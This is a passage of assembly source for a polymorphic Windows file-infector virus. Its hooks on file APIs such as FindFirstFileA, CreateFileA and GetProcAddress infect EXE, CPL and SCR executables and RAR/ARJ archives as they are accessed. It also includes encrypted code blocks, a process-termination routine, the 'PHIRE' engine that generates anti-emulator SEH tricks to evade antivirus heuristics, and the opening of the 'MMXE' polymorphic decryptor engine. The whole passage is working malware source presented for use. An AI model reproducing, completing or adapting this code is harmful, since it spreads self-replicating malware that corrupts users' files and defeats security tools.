	apicall _CreateFileA
	ret
OpenFile        endp

; input:
;       ECX = Size to map
; output:
;       EAX = Mapping handle/Error

CreateMap       proc
	xor     eax,eax
	push    eax
	push    ecx
	push    eax
	push    00000004h
	push    eax
	push    dword ptr [ebp+FileHandle]
	apicall _CreateFileMappingA
	ret
CreateMap       endp

; input:
;       ECX = Size to map
; output:
;       EAX = Mapping address/Error
;

MapFile         proc
	xor     eax,eax
	push    ecx
	push    eax
	push    eax
	push    00000002h
	push    dword ptr [ebp+MapHandle]
	apicall _MapViewOfFile
	ret
MapFile         endp

; input:
;       EDI = Pointer to the name of the window of the process we want to kill
; output:
;       Nothing
;

TerminateProc   proc
	xor     ebx,ebx                                 ; Thnx 2 Bennyg0d :)
	push    edi
	push    ebx
	apicall _FindWindowA
	xchg    eax,ecx
	jecxz   TP_ErrorExit
	push    ebx
	push    ebx
	push    00000012h
	push    ecx
	apicall _PostMessageA
	test    al,00h
	org     $-1
TP_ErrorExit:
	stc
	ret
TerminateProc   endp

; input:
;       ESI = Pointer to the code to process
;       EDI = Size of such code
; output:
;       EAX = CRC32 of that code
;

CRC32           proc
	cld
	xor     ecx,ecx                         ; Optimized by me - 2 bytes
	dec     ecx                             ; less
	mov     edx,ecx
	push    ebx
NextByteCRC:
	xor     eax,eax
	xor     ebx,ebx
	lodsb
	xor     al,cl
	mov     cl,ch
	mov     ch,dl
	mov     dl,dh
	mov     dh,8
NextBitCRC:
	shr     bx,1
	rcr     ax,1
	jnc     NoCRC
	xor     ax,08320h
	xor     bx,0EDB8h
NoCRC:  dec     dh
	jnz     NextBitCRC
	xor     ecx,eax
	xor     edx,ebx
	dec     edi                             ; Another fool byte less
	jnz     NextByteCRC
	pop     ebx
	not     edx
	not     ecx
	mov     eax,edx
	rol     eax,16
	mov     ax,cx
	ret
CRC32           endp

; input:
;       ESI = Offset where check for MZ mark
; output:
;       CF  = Set if fail, clear if all ok.
;

CheckMZ         proc
	pushad
	call    CMZ_SetSEH
	mov     esp,[esp+08h]
	jmp     CMZ_Exit
CMZ_SetSEH:
	xor     edx,edx
	push    dword ptr fs:[edx]
	mov     fs:[edx],esp
	cmp     word ptr [esi],"ZM"
	jnz     CMZ_Exit
	test    al,00h
	org     $-1
CMZ_Exit:
	stc
	push    00h                             ; Thanx 2 Super for pointing
	pop     edx                             ; me a bug here :)
	pop     dword ptr fs:[edx]
	pop     edx
	popad
	ret
CheckMZ         endp

; input:
;       TOS+00 = Return Address
;       TOS+04 = Size of what we want to know the checksum
;       TOS+08 = Address where begin to calculate checksum
; output:
;       EAX = Checksum
;

Checksum        proc PASCAL lpFile:DWORD,dwFileLen:DWORD
	xor     edx,edx
	mov     esi,lpFile
	mov     ecx,dwFileLen
	shr     ecx,1
@CSumLoop:
	movzx   eax,word ptr [esi]
	add     edx,eax
	mov     eax,edx
	movzx   edx,dx
	shr     eax,10h
	add     edx,eax
	inc     esi
	inc     esi
	loop    @CSumLoop
	mov     eax,edx
	shr     eax,10h
	add     ax,dx
	add     eax,dwFileLen
	ret
Checksum        endp

; input:
;       EDI = Where generate the 6 char string
; output:
;       Nothing.
;

GenerateName    proc
	push    6                               ; Generate in [EDI] a 6 char
	pop     ecx                             ; name
gcl00p: call    GenChar
	stosb
	loop    gcl00p
	ret
GenChar:
	call    random                          ; Generate letter between
	and     al,25d                          ; A and Z :]
	add     al,41h
	ret
GenerateName    endp

; input:
;       EAX = CRC32 of the API we want to get info
; output:
;       EAX = API address
;       EBX = API in Import Table

GetAPI_IT_CRC32 proc
	mov     dword ptr [ebp+TempGA_IT1],eax

	mov     esi,dword ptr [ebp+imagebase]
	add     esi,3Ch
	lodsw
	cwde
	add     eax,dword ptr [ebp+imagebase]
	xchg    esi,eax
	lodsd

	cmp     eax,"EP"
	jnz     nopes

	add     esi,7Ch
	lodsd
	push    eax
	lodsd
	mov     ecx,eax
	pop     esi
	add     esi,dword ptr [ebp+imagebase]
	
SearchK32:
	push    esi
	mov     esi,[esi+0Ch]
	add     esi,dword ptr [ebp+imagebase]
	lea     edi,[ebp+K32_DLL]
	mov     ecx,K32_Size
	cld
	push    ecx
	rep     cmpsb
	pop     ecx
	pop     esi
	jz      gotcha
	add     esi,14h
	jmp     SearchK32
gotcha:
	cmp     byte ptr [esi],00h
	jz      nopes
	mov     edx,[esi+10h]
	add     edx,dword ptr [ebp+imagebase]
	lodsd
	or      eax,eax
	jz      nopes

	xchg    edx,eax
	add     edx,[ebp+imagebase]
	xor     ebx,ebx
loopy:
	cmp     dword ptr [edx+00h],00h
	jz      nopes
	cmp     byte ptr  [edx+03h],80h
	jz      reloop

	mov     edi,[edx]
	add     edi,dword ptr [ebp+imagebase]
	inc     edi
	inc     edi
	mov     esi,edi

	pushad
	eosz_edi
	sub     edi,esi

	call    CRC32
	mov     [esp.PUSHAD_ECX],eax
	popad

	cmp     dword ptr [ebp+TempGA_IT1],ecx
	jz      wegotit
reloop:
	inc     ebx
	add     edx,4
	loop    loopy
wegotit:
	shl     ebx,2
	add     ebx,eax
	mov     eax,[ebx]
	test    al,00h
	org     $-1
nopes:
	stc
	ret
GetAPI_IT_CRC32 endp


;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]
;|| Thread used for hook IT desired APIs (Per-Process residence)           ||
;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]

ThrPerProcess   proc PASCAL delta_thread:DWORD

	mov     ebp,delta_thread

	xor     ecx,ecx
TPP_Sleep:
	mov     cl,THREAD_SLEEPING
TPP_semaphore   equ $-1
	jecxz   TPP_Sleep

	pushad

	call    TPP_SetupSEH
	mov     esp,[esp+08h]
	jmp     TPP_RestoreSEH
TPP_SetupSEH:
	xor     edx,edx
	push    dword ptr fs:[edx]
	mov     fs:[edx],esp

	call    iENC_decrypt
	dd      00000000h
	dd      eBlockD-BlockD

BlockD  label   byte


	call    GetK32
	push    eax
	pop     dword ptr [ebp+TmpModuleBase]

	lea     esi,[ebp+@@Hookz]
@@hooker:
	clc
	lodsd
	push    esi
	call    GetAPI_IT_CRC32
	pop     esi
	jnc     @@hookshit
	mov     eax,[esi-4]
	push    edi esi
	call    GetAPI_ET_CRC32
	pop     edi esi
	add     edi,04h
	stosd
	xchg    edi,esi
	jmp     @@checkshit
@@hookshit:
	xchg    eax,ecx
	lodsd
	add     eax,ebp
	mov     [ebx],eax
	xchg    eax,ecx
	xchg    esi,edi
	stosd
	xchg    esi,edi
@@checkshit:
	cmp     byte ptr [esi],Billy_Bel
	jnz     @@hooker

eBlockD label   byte

TPP_RestoreSEH:
	xor     edx,edx
	pop     dword ptr fs:[edx]
	pop     edx

	popad

	and     byte ptr [ebp+TPP_semaphore],THREAD_SLEEPING

	jmp     ExitThread
ThrPerProcess   endp

;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]
;|| Hooked API's handlerz                                                  ||
;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]

HookMoveFileA:
	call    DoHookStuff
	jmp     dword ptr [eax+hMoveFileA]

HookCopyFileA:
	call    DoHookStuff
	jmp     dword ptr [eax+hCopyFileA]

HookGetFullPathNameA:
	call    DoHookStuff
	jmp     dword ptr [eax+hGetFullPathNameA]

HookDeleteFileA:
	call    DoHookStuff
	jmp     dword ptr [eax+hDeleteFileA]

HookWinExec:
	call    DoHookStuff
	jmp     dword ptr [eax+hWinExec]

HookCreateFileA:
	call    DoHookStuff
	jmp     dword ptr [eax+hCreateFileA]

HookCreateProcessA:
	call    DoHookStuff
	jmp     dword ptr [eax+hCreateProcessA]

HookGetFileAttributesA:
	call    DoHookStuff
	jmp     dword ptr [eax+hGetFileAttributesA]

HookSetFileAttributesA:
	call    DoHookStuff
	jmp     dword ptr [eax+hSetFileAttributesA]

Hook_lopen:
	call    DoHookStuff
	jmp     dword ptr [eax+h_lopen]

HookMoveFileExA:
	call    DoHookStuff
	jmp     dword ptr [eax+hMoveFileExA]

HookCopyFileExA:
	call    DoHookStuff
	jmp     dword ptr [eax+hCopyFileExA]

HookOpenFile:
	call    DoHookStuff
	jmp     dword ptr [eax+hOpenFile]

HookGetProcAddress:
	pushad                                  ; Save all the registers

	call    iENC_decrypt
	dd      00000000h
	dd      eBlockE-BlockE

BlockE  label   byte

	call    GetDeltaOffset                  ; EBP = Delta Offset
	mov     eax,[esp+24h]                   ; EAX = Base address of module
	cmp     eax,dword ptr [ebp+kernel]      ; Is EAX=K32?
	jnz     OriginalGPA                     ; If not, it's not our problem
	mov     [esp.PUSHAD_EAX],ebp            ; Store delta offset
	popad
	pop     dword ptr [eax+HGPA_RetAddress] ; Put ret address in a safe
						; place

	call    dword ptr [eax+hGetProcAddress] ; Call original API
	or      eax,eax                         ; Fail? Duh!
	jz      HGPA_SeeYa

	pushad
	xchg    eax,ebx                         ; EBX = Address of function

	call    GetDeltaOffset                  ; EBP = Delta offset

	mov     ecx,nHookedAPIs                 ; ECX = Number of hooked apis
	lea     esi,[ebp+@@Hookz+08h]           ; ESI = Ptr to array of API
						; addresses
	xor     edx,edx                         ; EDX = Counter (set to 0)
HGPA_IsHookableAPI?:
	lodsd                                   ; EAX = Address of a hooked API
	cmp     ebx,eax                         ; Is equal to requested address?
	jz      HGPA_IndeedItIs                 ; If yes, it's interesting 4 us
	add     esi,08h                         ; Get ptr to another one
	inc     edx                             ; Increase counter
	loop    HGPA_IsHookableAPI?             ; Search loop
	jmp     OriginalGPAx

HGPA_IndeedItIs:
	lea     esi,[ebp+@@Hookz+04h]
	imul    eax,edx,0Ch                     ; Multiply per 12
	add     esi,eax                         ; Get the correct offset
	lodsd                                   ; And get the value
	add     eax,ebp                         ; Adjust it to delta
	mov     [esp.PUSHAD_EAX],eax
	popad                                   ; EAX = Hooked API address
eBlockE label   byte

HGPA_SeeYa:
	push    12345678h
HGPA_RetAddress equ $-4
	ret

OriginalGPAx:
	mov     [esp.PUSHAD_EAX],ebp            ; This is a jump to the origi-
	popad                                   ; nal GetProcAddress
	push    dword ptr [eax+HGPA_RetAddress]
	jmp     dword ptr [eax+hGetProcAddress]

OriginalGPA:
	mov     [esp.PUSHAD_EAX],ebp            ; This is a jump to the origi-
	popad                                   ; nal GetProcAddress
	jmp     dword ptr [eax+hGetProcAddress]

HookFindFirstFileA:
	pushad                                  ; Save all reggies

	call    iENC_decrypt
	dd      00000000h
	dd      eBlockF-BlockF

BlockF  label   byte

	call    GetDeltaOffset                  ; EBP = Delta Offset
	mov     eax,[esp+20h]                   ; EAX = Return Address
	mov     dword ptr [ebp+FFRetAddress],eax
	mov     eax,[esp+28h]                   ; EAX = Ptr to WFD
	mov     dword ptr [ebp+FF_WFD],eax
	mov     [esp.PUSHAD_EAX],ebp            ; Save Delta Offset
	popad
	add     esp,4                           ; Remove this ret address from
						; stack

	call    dword ptr [eax+hFindFirstFileA] ; Call original API

	inc     eax
	jz      _FF_GoAway
	dec     eax
	jmp     twisted
_FF_GoAway:
	dec     eax
	jmp     FF_GoAway
twisted:
	pushad                                  ; Save reggies and flaggies
	pushfd

	call    GetDeltaOffset                  ; Delta again

	movzx   ebx,byte ptr [ebp+WFD_Handles_Count] ; Number of active hndlers
	mov     edx,[ebp+WFD_HndInMem]          ; Our Handle table in mem

eBlockF label   byte

	mov     esi,12345678h                   ; Ptr to filename
FF_WFD  equ     $-4
	add     esi,(offset WFD_szFileName-offset WIN32_FIND_DATA)

	cmp     ebx,n_Handles                   ; Over max hnd storing?
	jae     AvoidStoring                    ; Shit...

	mov     dword ptr [edx+ebx*8],eax       ; Store Handle
	mov     dword ptr [edx+ebx*8+4],esi     ; Store WFD offset

	inc     byte ptr [ebp+WFD_Handles_Count]
      
AvoidStoring:
	push    esi
	call    Check4ValidFile                 ; Is a reliable file 4 inf?
	pop     edi 
	jecxz   FF_AvoidInfekt                  ; Duh!
	dec     ecx
	jecxz   FF_InfPE
	call    InfectArchiveEDI
	jmp     FF_AvoidInfekt
FF_InfPE:
	call    InfectEDI                       ; Infect it
FF_AvoidInfekt:
	popfd
	popad

FF_GoAway:                                      ; Return to caller
	push    12345678h
FFRetAddress equ $-4
	ret

HookFindNextFileA:
	pushad                                  ; Save all reggies

	call    iENC_decrypt
	dd      00000000h
	dd      eBlock10-Block10

Block10 label   byte

	call    GetDeltaOffset                  ; Get delta offset
	mov     eax,[esp+20h]                   ; EAX = Return address
	mov     dword ptr [ebp+FNRetAddress],eax
	mov     eax,[esp+24h]                   ; EAX = Search Handle
	mov     dword ptr [ebp+FN_Hnd],eax
	mov     [esp.PUSHAD_EAX],ebp            ; Save delta offset
	popad
	add     esp,4                           ; Fix stack

	call    dword ptr [eax+_FindNextFileA]  ; Call original API
	or      eax,eax                         ; Fail? Damn.
	jz      FN_GoAway

	pushad                                  ; Save regs and flags
	pushfd

	call    GetDeltaOffset                  ; Get delta again

eBlock10 label  byte

	mov     eax,12345678h                   ; EAX = Search Handle
FN_Hnd  equ     $-4

	call    Check4ValidHandle               ; Is in our table? If yes,
	jc      FN_AvoidInfekt                  ; infect.

	xchg    esi,eax                         ; ESI = Pointer to WFD

	add     esi,(offset WFD_szFileName-offset WIN32_FIND_DATA)
	push    esi                             ; ESI = Ptr to filename
	call    Check4ValidFile                 ; Is reliable its inf.?
	pop     edi     
	jecxz   FN_AvoidInfekt                  ; Duh...
	dec     ecx
	jecxz   FN_InfPE
	call    InfectArchiveEDI
	jmp     FN_AvoidInfekt
FN_InfPE:
	call    InfectEDI                       ; Infect it !

FN_AvoidInfekt:
	popfd                                   ; Restore flags & regs
	popad

FN_GoAway:                                      ; Return to caller
	push    12345678h
FNRetAddress equ $-4
	ret

;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]
;|| Standard API handler                                                   ||
;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]

DoHookStuff:
	call    iENC_decrypt
	dd      00000000h
	dd      eBlock11-Block11

Block11 label   byte

	pushad
	pushfd
	call    GetDeltaOffset
	mov     edx,[esp+2Ch]                   ; Get filename to infect
	mov     esi,edx
	call    Check4ValidFile
	jecxz   ErrorDoHookStuff
	xchg    edi,edx
	dec     ecx
	jecxz   InfectWithHookStuff
InfectAnArchive:
	call    InfectArchiveEDI
	jmp     ErrorDoHookStuff
InfectWithHookStuff:
	call    InfectEDI
ErrorDoHookStuff:
	popfd                                   ; Preserve all as if nothing
	popad                                   ; happened :)
	push    ebp
	call    GetDeltaOffset                  ; Get delta offset 
	xchg    eax,ebp
	pop     ebp
	ret

eBlock11 label  byte

; input:
;       ESI = Pointer to file to check
; output:
;       ECX = 0 -> Not valid file
;       ECX = 1 -> Possible PE file
;       ECX = 2 -> Possible Archive
;

Check4ValidFile:
	xor     ecx,ecx
	lodsb
	or      al,al                           ; Find NULL? Shit...
	jz      C4VF_Error
	cmp     al,"."                          ; Dot found? Interesting...
	jnz     Check4ValidFile
	dec     esi
	lodsd                                   ; Put extension in EAX
	or      eax,20202020h                   ; Make string locase
	not     eax
	cmp     eax,not "exe."                  ; Is it an EXE? Infect!!!
	jz      C4VF_Successful
	cmp     eax,not "lpc."                  ; Is it a CPL? Infect!!!
	jz      C4VF_Successful
	cmp     eax,not "rcs."                  ; Is it a SCR? Infect!!!
	jz      C4VF_Successful
	cmp     eax,not "rar."                  ; Is it a RAR? Infect!!!
	jz      C4VF_SuccessfulArchive
	cmp     eax,not "jra."                  ; Is it an ARJ? Infect!!!
	jz      C4VF_SuccessfulArchive
C4VF_Error:
	ret
C4VF_SuccessfulArchive:
	inc     ecx
C4VF_Successful:
	inc     ecx
	ret

; input:
;       Nothing.
; output:
;       EBP = Delta Offset
;

GetDeltaOffset:
	call    @x1
   @x1: pop     ebp
	sub     ebp,offset @x1
	ret

; input:
;       EAX = Handle
; output:
;       EAX = WFD Offset of given handle
;       EDX = Places what it occupies in WFD_Handles structure
;       CF  = Set to 1 if it's found, to 0 if it wasn't
;

Check4ValidHandle:
	xor     edx,edx
	mov     edi,[ebp+WFD_HndInMem]
C4VH_l00p:
	cmp     edx,n_Handles                   ; Over limits? Shit...
	jae     C4VH_Error

	cmp     eax,[edx*8+edi]                 ; EAX = a handler stored in
	jz      C4VH_Successful                 ; table

	inc     edx                             ; Increase counter
	jmp     C4VH_l00p
C4VH_Successful:
	mov     eax,[edx*8+edi+4]               ; EAX = WFD Offset

	test    al,00h
	org     $-1
C4VH_Error:
	stc
	ret


; =:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=
; [PHIRE] - Polymorphic Header Idiot Random Engine v1.00     ? MMXE plug-in ?
; =:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=
;
; This is a  plug-in for MMXE v1.01, that is  able to generate  a polymorphic
; block of code (size defined by user) captable to  kill emulators  and  hide
; the real entrypoint from AV. This is an EPO  plug-in for my MMXE. Why i say
; it's a plug-in? Well, it  wouldn't work without  MMXE, and it adds features
; to that engine that it previously haven't. So, don't doubt it: it's a plug-
; in ;)
;
; PHIRE will generate some code like the following:
;
;       [...]
;       CALL    @@1
;       [...]
;       MOV     ESP,[ESP+08h]
;       [...]
;       POP     DWORD PTR FS:[0000h]
;       [...]
;       ADD     ESP,4
;       [...]
;       JMP     MMXE_DECRYPTOR
;       [...]
;  @@1: PUSH    DWORD PTR FS:[0000h]
;       [...]
;       MOV     DWORD PTR FS:[0000h],ESP
;       [...]
;       * -> From here until complete the 256 bytes of code, we'll fill this
;            with random data, so an exception will surely happen :)
;
; Each '[...]' means garbage code. This will be placed at the original entry-
; point of the infected file, and  stops all  the actual  emulators. So, this
; plug-in makes the virus to be undetectable heuristically.
;
; input:
;       EDI = Buffer where put the generated polymorphic code
;       EAX = Distance between host entry-point and virus entry-point
;       EBP = Delta Offset
; output:
;       Nothing.
;
;       All registers are preserved.
;

pLIMIT          equ     100h

phire           proc
	pushad

	call    iENC_decrypt
	dd      00000000h
	dd      eBlock12-Block12

Block12 label   byte

	mov     dword ptr [ebp+@@p_buffer],edi
	mov     dword ptr [ebp+@@p_distance],eax

	push    edi                             ; Clear work area
	xor     eax,eax
	mov     ecx,pLIMIT
	rep     stosb
	pop     edi

	and     dword ptr [ebp+@@reg_key],00h   ; Clear all registers :)
	call    @@clear_mask
	and     byte ptr [ebp+@@init_mmx?],00h  ; Don't allow MMX garbage

	call    @@gen_garbage

	mov     al,0E8h                         ; Write the provisional call
	stosb
	xor     eax,eax
	stosd
	mov     dword ptr [ebp+@@p_tmp_call],edi

	call    @@gen_garbage

	mov     eax,@@s_stack_fix               ; Generate some similar code
	call    r_range                         ; to MOV ESP,[ESP+08h]
	lea     ebx,[ebp+@@stack_fix]
	mov     eax,[ebx+eax*4]
	add     eax,ebp
	call    eax      

	call    @@gen_garbage

	mov     eax,@@s_seh_restore             ; Generate some similar code
	call    r_range                         ; to POP FS:[0000h]
	lea     ebx,[ebp+@@seh_restore]
	mov     eax,[ebx+eax*4]
	add     eax,ebp
	call    eax      

	call    @@gen_garbage

	mov     eax,@@s_stack_fix_nh            ; Generate some similar code
	call    r_range                         ; to ADD ESP,4
	lea     ebx,[ebp+@@stack_fix_nh]
	mov     eax,[ebx+eax*4]
	add     eax,ebp
	call    eax

	call    @@gen_garbage

	call    @@jump_to_decryptor             ; Generate the jump to the
						; decryptor
	call    @@gen_garbage

	mov     ebx,edi                         ; Call after SEH handler
	mov     eax,dword ptr [ebp+@@p_tmp_call]
	sub     ebx,eax
	mov     [eax-4],ebx

	call    @@gen_garbage

	mov     eax,@@s_seh_saveold             ; Generate some similar code
	call    r_range                         ; to PUSH FS:[0000h]
	lea     ebx,[ebp+@@seh_save_old]
	mov     eax,[ebx+eax*4]
	add     eax,ebp
	call    eax      

	call    @@gen_garbage

	mov     eax,@@s_seh_newhnd              ; Generate some similar code
	call    r_range                         ; to MOV FS:[0000h],ESP
	lea     ebx,[ebp+@@seh_newhnd]
	mov     eax,[ebx+eax*4]
	add     eax,ebp
	call    eax      

	call    @@gen_garbage

	mov     eax,pLIMIT
	mov     ecx,dword ptr [ebp+@@p_buffer]
	mov     ebx,edi
	sub     ebx,ecx
	sub     eax,ebx

	xchg    ecx,eax
@@fill_l00p:
	call    random
	stosb
	loop    @@fill_l00p

	popad
	ret

	db      00h,"[PHIRE v1.00]",00h

@@choose_aux1_reg:
	mov     eax,08h
	call    r_range
	or      eax,eax
	jz      @@choose_aux1_reg
	cmp     eax,_ESP
	jz      @@choose_aux1_reg
	cmp     al,byte ptr [ebp+@@reg_aux2]
	jz      @@choose_aux1_reg
	mov     byte ptr [ebp+@@reg_aux1],al
	ret

@@choose_aux2_reg:
	mov     eax,08h
	call    r_range
	or      eax,eax
	jz      @@choose_aux2_reg
	cmp     eax,_ESP
	jz      @@choose_aux2_reg
	cmp     al,byte ptr [ebp+@@reg_aux1]
	jz      @@choose_aux2_reg
	mov     byte ptr [ebp+@@reg_aux2],al
	ret

; Generate the jump to the MMXE decryptor

@@jump_to_decryptor:
	mov     al,0E9h
	stosb
	xor     eax,eax
	stosd

	mov     ebx,edi
	sub     ebx,dword ptr [ebp+@@p_buffer]

	mov     eax,dword ptr [ebp+@@p_distance]
	sub     eax,ebx
	mov     dword ptr [edi-4],eax
	ret

; ---

; Fixing stack after fault - type 1:
;       MOV     ESP,[ESP+08h]

@@stack_fix_type1:
	mov     eax,0824648Bh
	stosd
	ret

; Fixing stack after fault - type 2:
;       MOV     REG,ESP
;       MOV     ESP,[REG+08h]

@@stack_fix_type2:
	mov     al,08Bh
	stosb
	call    @@choose_aux1_reg
	shl     eax,3
	or      al,11000100b
	stosb

	call    @@gen_garbage

	mov     ax,608Bh
	or      ah,byte ptr [ebp+@@reg_aux1]
	stosw
	mov     al,08h
	stosb

	and     byte ptr [ebp+@@reg_aux1],00h
	ret

; Fixing stack after fault - type 3:
;       MOV     REG,[ESP+08h]
;       MOV     ESP,REG

@@stack_fix_type3:
	mov     al,8Bh
	stosb
	call    @@choose_aux1_reg
	shl     eax,3
	or      al,01000100b
	stosb
	mov     ax,0824h
	stosw

	call    @@gen_garbage

	mov     al,08Bh
	stosb
	mov     al,byte ptr [ebp+@@reg_aux1]
	or      al,11100000b
	stosb
	
	and     byte ptr [ebp+@@reg_aux1],00h
	ret

; Fixing stack after fault - type 4:
;       MOV     REG1,ESP
;       MOV     REG2,[REG1+08h]
;       MOV     ESP,REG2

@@stack_fix_type4:
	mov     al,08Bh
	stosb
	call    @@choose_aux1_reg
	shl     eax,3
	or      al,11000100b
	stosb

	call    @@gen_garbage

	call    @@choose_aux2_reg

	mov     ax,408Bh
	or      ah,byte ptr [ebp+@@reg_aux1]
	movzx   ebx,byte ptr [ebp+@@reg_aux2]
	shl     ebx,3
	or      ah,bl
	stosw
	mov     al,08h
	stosb

	call    @@gen_garbage

	mov     al,08Bh
	stosb
	mov     al,byte ptr [ebp+@@reg_aux2]
	or      al,11100000b
	stosb

	and     byte ptr [ebp+@@reg_aux1],00h
	and     byte ptr [ebp+@@reg_aux2],00h
	ret

; ---

; Restoring old SEH handler - type 1:
;       POP     DWORD PTR FS:[0000h]

@@seh_restore_old_type1:
	mov     eax,068F6467h
	stosd
	xor     eax,eax
	stosw
	ret

; Restoring old SEH handler - type 2:
;       ZERO    REG
;       POP     DWORD PTR FS:[REG]

@@seh_restore_old_type2:
	call    @@choose_aux1_reg
	cmp     al,_EBP
	jz      @@seh_restore_old_type2
	call    @@gen_zero_reg

	call    @@gen_garbage

	mov     ax,08F64h
	stosw
	mov     al,byte ptr [ebp+@@reg_aux1]
	stosb
	and     byte ptr [ebp+@@reg_aux1],00h
	ret

; ---

; Fixing stack because new handler - type 1:
;       POP     REG

@@stack_fix_nh_type1:
	call    @@choose_aux1_reg

	add     al,58h
	stosb

	and     byte ptr [ebp+@@reg_aux1],00h
	ret

; Fixing stack because new handler - type 2:
;   eq. ADD     ESP,4

@@stack_fix_nh_type2:
	mov     byte ptr [ebp+@@reg_aux1],_ESP

	call    @@gen_incpointer

	and     byte ptr [ebp+@@reg_aux1],00h
	ret

; ---

; Saving old SEH handler - type 1:
;       PUSH    DWORD PTR FS:[0000h]

@@seh_save_old_type1:
	mov     eax,36FF6467h
	stosd
	xor     eax,eax
	stosw
	ret

; Saving old SEH handler - type 2:
;       ZERO    REG
;       PUSH    DWORD PTR FS:[REG]

@@seh_save_old_type2:
	call    @@choose_aux1_reg
	cmp     al,_EBP
	jz      @@seh_save_old_type2
	call    @@gen_zero_reg

	call    @@gen_garbage

	mov     ax,0FF64h
	stosw
	mov     al,byte ptr [ebp+@@reg_aux1]
	or      al,00110000b
	stosb
	and     byte ptr [ebp+@@reg_aux1],00h
	ret

; Saving old SEH handler - type 3:
;       MOV     REG,DWORD PTR FS:[0000h]
;       PUSH    REG

@@seh_save_old_type3:
	call    @@choose_aux1_reg

	mov     eax,008B6467h
	stosd
	dec     edi
	mov     al,byte ptr [ebp+@@reg_aux1]
	shl     eax,3
	or      al,00000110b
	stosb
	xor     eax,eax
	stosw

	call    @@gen_garbage

	mov     al,byte ptr [ebp+@@reg_aux1]
	add     al,50h
	stosb

	and     byte ptr [ebp+@@reg_aux1],00h
	ret

; Saving old SEH handler - type 4:
;       ZERO    REG1
;       MOV     REG2,DWORD PTR FS:[REG1]
;       PUSH    REG2

@@seh_save_old_type4:
	call    @@choose_aux1_reg
	cmp     al,_EBP
	jz      @@seh_save_old_type4

	call    @@gen_zero_reg

	call    @@gen_garbage

	mov     ax,8B64h
	stosw

	call    @@choose_aux2_reg
	shl     eax,3
	or      al,byte ptr [ebp+@@reg_aux1]
	stosb

	call    @@gen_garbage

	mov     al,byte ptr [ebp+@@reg_aux2]
	add     al,50h
	stosb

	and     byte ptr [ebp+@@reg_aux1],00h
	and     byte ptr [ebp+@@reg_aux2],00h
	ret

; ---

; Set new SEH handler type 1:
;       MOV     FS:[0000h],ESP

@@seh_newhnd_type1:
	mov     eax,26896467h
	stosd
	xor     eax,eax
	stosw
	ret

; Set new SEH handler type 2:
;       ZERO    REG
;       MOV     FS:[REG],ESP

@@seh_newhnd_type2:
	call    @@choose_aux1_reg
	cmp     al,_EBP
	jz      @@seh_newhnd_type2

	call    @@gen_zero_reg

	call    @@gen_garbage

	mov     ax,8964h
	stosw
	mov     al,byte ptr [ebp+@@reg_aux1]
	or      al,00100000b
	stosb

	and     byte ptr [ebp+@@reg_aux1],00h
	ret

; Tables for a random construction of SEH trick for stop emulatorz

@@stack_fix     label   byte
	dd      offset (@@stack_fix_type1)
	dd      offset (@@stack_fix_type2)
	dd      offset (@@stack_fix_type3)
	dd      offset (@@stack_fix_type4)
@@s_stack_fix   equ     (($-offset @@stack_fix)/4)

@@seh_restore   label   byte
	dd      offset (@@seh_restore_old_type1)
	dd      offset (@@seh_restore_old_type2)
@@s_seh_restore equ     (($-offset @@seh_restore)/4)

@@stack_fix_nh  label   byte
	dd      offset (@@stack_fix_nh_type1)
	dd      offset (@@stack_fix_nh_type2)
@@s_stack_fix_nh  equ   (($-offset @@stack_fix_nh)/4)

@@seh_save_old  label   byte
	dd      offset (@@seh_save_old_type1)
	dd      offset (@@seh_save_old_type2)
	dd      offset (@@seh_save_old_type3)
	dd      offset (@@seh_save_old_type4)
@@s_seh_saveold equ     (($-offset @@seh_save_old)/4)

@@seh_newhnd    label   byte
	dd      offset (@@seh_newhnd_type1)
	dd      offset (@@seh_newhnd_type2)
@@s_seh_newhnd  equ     (($-offset @@seh_newhnd)/4)

phire           endp

eBlock12 label  byte

; =:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=
; [MMXE] - MultiMedia eXtensions Engine v1.01
; =:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=
;
; This  is  a  bugfixed  and improved  version  of  my MMXE v1.00. Enjoy  it!
; PS: Of course, this engine is so  far away from  Mental Driller's code, but
; at least it tries to be poly, huh? :)
;
; Well, the poly decryptor generated with MMXE will be as this one:
;
;       +-------------------+
;       |   MMX detection   | ???
;       +-------------------+   ?
;       |   MMX decryptor   |   ? [ If not MMX detected ]
;       +-------------------+ <??
;       | Non MMX decryptor |
;       +-------------------+ }
;       |                   | }
;       |    Virus body     | } [ This is the encrypted part :) ]
;       |                   | }
;       +-------------------+ }
;
; The generated code doesn't pretend in any  way to seem  realistic: just the
; opposite. It generates a lot of nonsenses (very few executables use MMX op-
; codes). This can be a problem (or not) depending the viewpoint.
;
; input:
;       ECX = Size of code to encrypt
;       ESI = Pointer to the data to encrypt
;       EDI = Buffer where put the decryptor
;       EBP = Delta Offset
; output:
;       ECX = Decryptor size
;
;       All the other registers, preserved.
;

; [ Default MMXE settings ]

LIMIT           equ     800h                    ; Decryptor size (2K)
RECURSION       equ     05h                     ; The recursion level of THME
nGARBAGE        equ     08h                     ; Sorta level of garbage

; [ Registers ]

_EAX            equ     00000000b               ; All these are the numeric
_ECX            equ     00000001b               ; value of all the registers.
_EDX            equ     00000010b               ; Heh, i haven't used here 
_EBX            equ     00000011b               ; all this, but... wtf? they
_ESP            equ     00000100b               ; don't waste bytes, and ma-
_EBP            equ     00000101b               ; ke this shit to be more
_ESI            equ     00000110b               ; clear :)
_EDI            equ     00000111b               ;

; [ MMX registers ]

_MM0            equ     00000000b
_MM1            equ     00000001b
_MM2            equ     00000010b
_MM3            equ     00000011b
_MM4            equ     00000100b
_MM5            equ     00000101b
_MM6            equ     00000110b
_MM7            equ     00000111b

; [ Internal flags ]

_CHECK4MMX      equ     0000000000000001b
